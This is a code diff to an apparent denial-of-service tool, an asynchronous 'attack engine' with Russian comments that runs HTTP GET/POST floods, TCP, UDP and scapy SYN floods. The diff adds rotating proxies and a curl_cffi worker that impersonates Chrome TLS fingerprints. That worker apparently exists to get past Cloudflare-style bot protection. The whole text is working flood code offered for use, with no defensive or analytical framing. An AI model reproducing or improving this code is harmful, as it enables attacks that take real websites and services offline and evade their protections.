@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import asyncio, aiohttp, random, time, json, socket, ssl, threading
+import asyncio, aiohttp, random, time, json, socket, ssl, threading, os
 from urllib.parse import urlparse
 
 class AsyncAttackEngine:
@@ -29,6 +29,7 @@ class AsyncAttackEngine:
         self.udp_random_size = udp_random_size
         self.stats = {'count': 0, 'rps': 0, 'errors': 0}
         self._stop_event = asyncio.Event()
+        self.proxy_cycle = 0
 
     def launch(self, target, method="GET", threads=100, progress_callback=None,
                hybrid=False, l4_method=None):
@@ -43,33 +44,26 @@ class AsyncAttackEngine:
 
     async def _run_attack(self, progress_callback=None):
         tasks = []
-        if self.method in ("TCP", "UDP", "SYN_FLOOD"):
-            l4 = self.method
-        else:
-            l4 = None
-        # Запускаем L7 воркеры
-        if not l4 and self.method not in ("TCP", "UDP", "SYN_FLOOD"):
+        l7_methods = ["GET", "POST", "CFB", "CFBUAM", "RAPID"]
+        l4_methods = ["TCP", "UDP", "SYN_FLOOD"]
+        if self.method in l7_methods:
             for _ in range(self.threads):
                 tasks.append(asyncio.create_task(self._http_worker()))
-        # L4 воркеры
-        if l4 == "TCP":
-            for _ in range(self.threads):
-                tasks.append(asyncio.create_task(self._tcp_flood()))
-        elif l4 == "UDP":
-            for _ in range(self.threads):
-                tasks.append(asyncio.create_task(self._udp_flood()))
-        elif l4 == "SYN_FLOOD":
-            tasks.append(asyncio.create_task(self._syn_flood()))
-
-        # Гибрид: если hybrid=True, добавляем L4 к L7
-        if self.l4_method and not l4:
+        elif self.method in l4_methods:
+            if self.method == "TCP":
+                for _ in range(self.threads):
+                    tasks.append(asyncio.create_task(self._tcp_flood()))
+            elif self.method == "UDP":
+                for _ in range(self.threads):
+                    tasks.append(asyncio.create_task(self._udp_flood()))
+            elif self.method == "SYN_FLOOD":
+                tasks.append(asyncio.create_task(self._syn_flood()))
+        if self.l4_method and self.method not in l4_methods:
             for _ in range(self.threads // 2):
                 if self.l4_method == "TCP":
                     tasks.append(asyncio.create_task(self._tcp_flood()))
                 elif self.l4_method == "UDP":
                     tasks.append(asyncio.create_task(self._udp_flood()))
-
-        # Мониторинг
         async def monitor():
             last_count = 0
             while self.running:
@@ -80,27 +74,68 @@ class AsyncAttackEngine:
                 if progress_callback:
                     progress_callback(self.stats['rps'], current)
         tasks.append(asyncio.create_task(monitor()))
-
         await asyncio.gather(*tasks, return_exceptions=True)
         self.running = False
 
     async def _http_worker(self):
+        # Используем curl_cffi для CFB/CFBUAM/RAPID
+        use_curl = self.method in ("CFB", "CFBUAM", "RAPID") and self._has_curl_cffi()
+        if use_curl:
+            await self._curl_worker()
+            return
         connector = aiohttp.TCPConnector(limit=0, ssl=False)
         async with aiohttp.ClientSession(connector=connector) as session:
             while self.running:
                 try:
                     url = self.target if self.target.startswith('http') else f'http://{self.target}'
+                    proxy = self._get_proxy()
+                    kwargs = {}
+                    if proxy:
+                        kwargs['proxy'] = proxy
                     if self.method == "GET":
-                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
+                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=2), **kwargs) as resp:
                             await resp.read()
                     elif self.method == "POST":
-                        async with session.post(url, data=b'data', timeout=aiohttp.ClientTimeout(total=2)) as resp:
+                        async with session.post(url, data=b'data', timeout=aiohttp.ClientTimeout(total=2), **kwargs) as resp:
                             await resp.read()
                     self.stats['count'] += 1
                 except:
                     self.stats['errors'] += 1
                 if self.jitter:
                     await asyncio.sleep(self.jitter / 1000)
+
+    async def _curl_worker(self):
+        try:
+            from curl_cffi import requests as curl_requests
+            while self.running:
+                try:
+                    url = self.target if self.target.startswith('http') else f'http://{self.target}'
+                    if self.method == "CFBUAM":
+                        resp = curl_requests.get(url, impersonate="chrome120")
+                    elif self.method == "RAPID":
+                        resp = curl_requests.get(url, impersonate="chrome120", http2=True)
+                    else:
+                        resp = curl_requests.get(url, impersonate="chrome110")
+                    self.stats['count'] += 1
+                except:
+                    self.stats['errors'] += 1
+                if self.jitter:
+                    await asyncio.sleep(self.jitter / 1000)
+        except ImportError:
+            pass
+
+    def _has_curl_cffi(self):
+        try:
+            import curl_cffi
+            return True
+        except:
+            return False
+
+    def _get_proxy(self):
+        if self.proxy_list:
+            self.proxy_cycle = (self.proxy_cycle + 1) % len(self.proxy_list)
+            return self.proxy_list[self.proxy_cycle]
+        return None
 
     async def _tcp_flood(self):
         while self.running:
@@ -129,7 +164,6 @@ class AsyncAttackEngine:
         try:
             from scapy.all import IP, TCP, send
         except ImportError:
-            print("Scapy не установлен")
             return
         while self.running:
             pkt = IP(dst=self.target) / TCP(dport=self.port, flags='S')
